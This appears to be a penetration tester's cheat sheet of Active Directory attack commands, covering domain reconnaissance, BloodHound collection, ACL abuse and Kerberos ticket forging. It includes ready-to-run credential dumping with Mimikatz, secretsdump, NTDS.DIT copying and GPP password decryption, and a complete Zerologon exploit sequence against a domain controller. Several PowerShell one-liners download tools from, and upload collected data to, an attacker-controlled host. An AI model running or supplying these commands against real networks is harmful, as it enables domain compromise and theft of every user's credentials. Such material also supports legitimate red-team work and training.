Active Directory


# Recon

net view /all                                     Show all shares
net view /all /domain                             Show all shares in the domain
nltest /domain_trusts /all_trusts                 Show domain trusts
nltest /dclist:<domain>                           Show domain controllers for a given domain
net localgroup "administrator"                    Show users in the local administrator group
net group "domain admins" /domain                 Show users in the domain admins Security Group
net user /domain                                  Show all domain users
net user <user> /domain                           Show all Security Groups a domain user belongs to
net group /domain                                 Show all Security Groups in a domain

AdFind.exe -f "(objectcategory=person)"
AdFind.exe -f "(objectcategory=computer)"
AdFind.exe -sc trustdmp
AdFind.exe -gcb -sc trustdmp
AdFind.exe -subnets -f "(objectCategory=subnet)"
AdFind.exe -sc domainlist
AdFind.exe -sc dcmodes
AdFind.exe -sc adminfo
AdFind.exe -sc dclist
AdFind.exe -sc computers_pwdnotreqd

dig -t SRV _gc._tcp.lab.acme.org                  Global catalog
dig -t SRV _ldap._tcp.acme.org                    LDAP servers
dig -t SRV _kerberos._tcp.acme.org                Kerberos KDC
dig -t SRV _kpasswd._tcp.acme.org                 Kerberos password change server

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='acme.org'"

nmap --script broadcast-dhcp-discover			Locate the DNS server
dnsrecon -r <current Class C> -n <DNS server>

Using Windows > cmd > powershell
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
Look for PdcRoleOwner and Name
------------------------------------------------------------------------------------------------------

# BloodHound

BloodHound uses graph theory to identify critical attack paths in Active Directory.
It enables you to quickly identify misconfigurations, simulate complex attack paths and bring greater awareness to Active Directory risks.

SharpHound is built on top of Windows Native APIs.
It uses Microsoft's System.DirectoryServices.Protocols namespace to query information via LDAP.
It also leverages the following Microsoft Win32API functions to query information form servers and workstations:
	NetSessionEnum
	NetWkstUserEnum
	NetWkstaGetInfo
	NetLocalGroupMembers

The default collection method will collect the following pieces of information from the domain controller:
* Security group memberships
* Domain trusts
* Abusable rights on Active Directory objects
* Group Policy links
* OU tree structure
* Several properties from computer, group and user objects
* SQL admin links

Additionally, SharpHound will attempt to collect the following information from each domain-joined Windows computer:
* The members of the local administrators, remote desktop, distributed COM, and remote management groups
* Active sessions, which SharpHound will attempt to correlate to systems where users are interactively logged on

Anywhere from 1 second to a couple minutes.
Session Enumeration on servers can take upwards of 10-15 minutes if theres a large number of sessions.

https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
PS> Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

neo4j console
Split the screen horizontally
xdg-open http://localhost:7474 &
Login with username and password: neo4j
Set a new password

- How to reset the default password for neo4j
/usr/share/neo4j/bin/neo4j-admin set-initial-password neo4j
xdg-open http://localhost:7474 &
Login with username and password: neo4j
Set a new password.

- Windows
cd to a discrete, writable directory (C:\Users\<user>\Desktop)
powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/SharpHound.exe', 'SharpHound.exe')"

SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
SharpHound.exe -c Session                         On subsequent runs just collect session data

This will generate a zip file
Upload the file to Kali
powershell -nop -exec bypass "IEX (New-Object Net.Webclient).UploadString('http://192.168.1.5/sharp.zip',"<PostDATA>")"

- BloodHound UI
cd /opt/BloodHound-v4/BloodHound-linux-x64/
./BloodHound --no-sandbox
Login
Drag and drop the zip file into the UI
------------------------------------------------------------------------------------------------------------------------------------------------------

# ADACLScanner

cd to a discrete, writable directory (C:\Users\<user>\Desktop)
powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/ADACLScan.ps1', 'ADACLScan.ps1')"

.\ADACLScan.ps1 -Base "OU=CORP,DC=ACME,DC=ORG"    Default is CSV output
.\ADACLScan.ps1 -Base "OU=CORP,DC=ACME,DC=ORG" -HTML

File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
------------------------------------------------------------------------------------------------------------------------------------------------------

# Abusing GenericAll access rights

This gives you full control of the targeted object.
Enumerate all domain users that our current account has GenericAll rights to.
This would allow you to change the password on any user found, without the knowledge of the old password.
------------------------------------------------------------------------------------------------------------------------------------------------------

# Domain Controller (DC)

nbtstat -a <target IP>

The hex code “1C” next to the domain name signifies that the target is a domain controller for the domain name listed on the left. 

U = UNIQUE and G = GROUP. When you see a hex code next to UNIQUE it is usually associated with the computer itself. With GROUP it is associated with 
the workgroup or domain.

Use the following MSF module to authenticate to the DC via SMB, create a volume shadow copy of the system drive, and downloads copies of NTDS.DIT
and SYSTEM hive. Then use Impacket to perform extraction of the hashes.

auxiliary/admin/smb/psexec_ntdsgrab
impacket-secretsdump -system SYSTEM -ntds NTDS.DIT LOCAL
impacket-secretsdump -hashes <hash> -just-dc LAB/dc\$@10.0.0.1
------------------------------------------------------------------------------------------------------------------------------------------------------

# Extract passwords from Group Policy

powershell.exe -nop -exec bypass
Import-Module PowerSploit.ps1
Get-GPPPassword

\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
Search xml files for cpassword.
GetDecryptedCpassword 'AES 256-bit encrypted password'
------------------------------------------------------------------------------------------------------------------------------------------------------

- Kerberos
The default authentication mechanism in Active Directory. It uses ticket-based authentication. A Key Distribution Center (KDC) grants a
Ticket Granting Ticket (TGT) to a user who requests access to a service or an account. This ticket can be redeemed to generate a service ticket (ST)
to access a particular service.

A user starts the communication process for a service request to a server with the service they want to access.
Every DC runs a Kerberos Distribution Center (KDC) service that processes all requests for Kerberos tickets.
The krbtgt account acts as a service account for the KDC.
It contains three parts: Database, Authentication Server (AS), and Ticket Granting Server (TGS).
The AS verifies client authentication. If the logged user is authenticated successfully the AS issues a ticket called TGT.
Ticket Granting Ticket (TGT) confirms to other servers that user has been authenticated.
Ticket Granting Server (TGS): User request for TGS from the KDC that will be used to access the service of the application server.

- Ticket Granting Server (TGS)

- Service Principal Name (SPN)
A unique name for a service account that is used by Kerberos to associate a service instance with service logon account. This allows a client
application to request that the service authenticate an account even if the client does not have the account name.

- Kerberoasting
Request the TGS ticket, which has the password hash of the SPN account, then crack it offline.

- Golden ticket
The krbtgt account’s NTLM hash is used to forge a TGT that grants unlimited access and persistence to a domain. Use Empire, Metasploit, or Mimikatz.
Leverages the certificate-based authentication in Active Directory enabled by default with the installation of Active Directory Certificate Services
(ADCS) by forging a new certificate using the private key of the CA certificate.

- Silver ticket
A forged TGS ticket for a specific service. TGS tickets are encrypted with the password hash for the service. If you can get the hash for a service
account, you can create a TGS ticket for that service.
------------------------------------------------------------------------------------------------------------------------------------------------------

Show MSSQL servers
setspn -T <domain> -Q MSSQLSvc/*

# Show DCs
dsquery server
get-netdomaincontroller
net group “domain controllers” /domain
net view \\<server>                               DCs contain SYSVOL and NETLOGON shares
cmd.exe /c set                                    LOGONSERVER variable

# Show DC in a specific domain
dsquery server -domain <something.int>
get-netdomaincontroller -domain <something.int>
nslookup <something.int>                          Internally, this will likely return DCs that are DNS servers
nslookup                                          pseudo-shell
    set type=all
    _ldap._tcp.<something.int>
nbtstat -a                                        Look for the attribute 1C

# Show DCs forest-wide
dsquery server -forest
get-netforestdomain

# Show Computer Account Objects
Show computer accounts
dsquery computer
dsquery * -filter “(objectclass=computer)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
get-netcomputer
get-netcomputer -fulldata | select-object dnshostname,description,operatingsystem,operatingsystemversion

# Show servers based on description
dsquery * -filter “&(objectclass=computer)(operatingsystem=*server*)” -attr dnshostname,description,operatingsystem,operatingsystemversion -limit 0
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show all Active Directory (AD) user accounts
dsquery user -limit 0
get-netuser 			This will display all accounts and their attributes.
get-netuser | select-object samaccountname

# Show attributes of a user account
dsquery * -filter “&(objectclass=user)(samaccountname=<user>)” -attr *
get-net-user <user>

# Show users with no password expiration
dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)” -attr samaccountname,name
get-netuser -filter "useraccountcontrol>=65535" | select-object samaccountname,name

# Show user accounts and their associated Service Principal Names (SPNs)
dsquery.exe * -filter "(serviceprincipalname=*)" -attr samaccountname, serviceprincipalname
dsquery.exe * -filter "&(serviceprincipalname=*)(samaccounttype=805306368)" -attr samaccountname,serviceprincipalname
get-netuser -spn | select-object samaccountname,serviceprincipalname
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show administrators
dsquery * -filter “&(objectclass=user)(admincount=1)” -attr samaccountname,name
dsquery * -filter “&(objectclass=group)(name=*admin*)” -attr member -limit 0 -l
dsquery group -name *admin*
get-netuser -admincount | select-object samaccountname,name
get-netgroup -fulldata -groupname "*admin*" | select-object member

# Show administrators with no password expiration
dsquery * -filter “&(objectclass=user)(useraccountcontrol>=65535)(admincount=1)” -attr samaccountname,name
get-netuser -filter "(useraccountcontrol>=65535)(admincount=1)" | select-object samaccountname,name

# Show domain admins
dsquery * -filter “name=domain admins” -attr member -l
get-netgroup -fulldata -groupname "domain admins" | select-object member
net group “domain admins” /domain

# Show enterprise admins
dsquery * -filter “name=enterprise admins” -attr member -d <forest domain.int> 
get-netgroup -fulldata -groupname "enterprise admins" | select-object member
net group “enterprise admins” /domain

# Show local administrators on DCs
dsquery * -filter “name=administrators” -attr member -l
get-netgroup -fulldata -groupname "administrators" | select-object member
net localgroup administrators /domain
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show Organizational Units (OU)
dsquery ou -limit 0
get-netou
get-netou -fulldata

# Show users under a specific OU
dsquery * “ou=something,dc=domain,dc=int” -filter objectclass=user

# Show child OUs under parent OU
dsquery * “ou=something,dc=domain,dc=int” -filter objectcategory=organizationalunit) -attr name
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show All Group Policy Objects (GPO) data
dsquery * -filter “(objectclass=grouppolicycontainer)” -attr *
get-netgpo

# Map GPO names (UUID) to display names
dsquery * -filter “(objectclass=grouppolicycontainer)” -attr name,displayname
get-netgpo | select-object name,displayname

# Show OUs and applied GPOs
dsquery * -filter “(objectcategory=organizationalunit)” -attr distinguishedname, gplink
get-netou -fulldata | select-object distinguishedname, gplink
------------------------------------------------------------------------------------------------------------------------------------------------------

# Show Trust Relationships
dsquery * -filter “(objectclass=TrustedDomain)” -attr trustpartner,flatname,trustdirection
get-netdomaintrust

# Show Sites and Subnets
dsquery subnet
get-netsubnet
dsquery site
get-netsite
dsquery * “cn=subnets,cn=sites,cn=configuration,dc=<something>,dc=<int>” -attr description,cn,siteobject

# Show Active Directory Partitions
dsquery partition
------------------------------------------------------------------------------------------------------------------------------------------------------

# Dump hashes for all domain users

powershell -nop -exec bypass
Import-Module PowerView
Invoke-UserHunter
Import-Module PowerSploit
Invoke-Mimikatz -ComputerName <name>

Open a new PS window as Administrator
Use the creds you just found

Import-Module PowerView
Get-NetDomainController
Import-Module PowerSploit
Invoke-NinjaCopy -Path C:\windows\ntds\ntds.dit -LocalDistination C:\ntds.dit -ComputerName <DC name>
ls

- Example 2
python secretsdump.py acme.org/<user@dc name>
------------------------------------------------------------------------------------------------------------------------------------------------------

# Zerologon CVE-2020-1472

apt install python3-virtualenv
virtualenv --python python3.8 zerologon-virtualenv
cd zerologon-virtualenv/bin
source ./activate
./pip3 install git+https://github.com/SecureAuthCorp/impacket.git
cd ../..

git clone https://github.com/SecuraBV/CVE-2020-1472.git
mv CVE-2020-1472 scanner
cd scanner
pip install -r requirements.txt
chmod 755 zerologon_tester.py
zerologon_tester.py <dc-name> <dc-ip>

cd ..
git clone https://github.com/dirkjanm/CVE-2020-1472.git
mv CVE-2020-1472 exploit
cd exploit
chmod 755 *.py
./cve-2020-1472-exploit.py <dc-name> <dc-ip>

cd ../zerologon-virtualenv/bin/
secretsdump.py -no-pass -just-dc lab.corp/dc-1\$@192.168.0.20
